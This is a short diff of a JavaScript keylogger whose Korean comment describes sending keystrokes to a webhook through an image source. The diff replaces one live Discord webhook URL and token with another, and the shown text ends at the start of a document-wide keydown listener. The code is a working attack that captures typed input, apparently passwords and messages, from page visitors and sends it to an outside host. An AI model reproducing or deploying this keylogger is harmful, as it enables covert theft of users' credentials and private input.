@@ -1,7 +1,7 @@
 // 키로깅 + Image src를 통한 웹훅 전송
 
 var log = "";
-var webhook = "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv";
+var webhook = "https://discord.com/api/webhooks/1482611916340990055/zR8T7P2A27C5B2H7X82YHpqQqmrBNzAxYBYu6C5wFD0DKnw0lqg3baprPGh8I49gxF9T";
 
 // 모든 키 입력 감지 + 특수 키 처리
 document.addEventListener("keydown", function(e) {
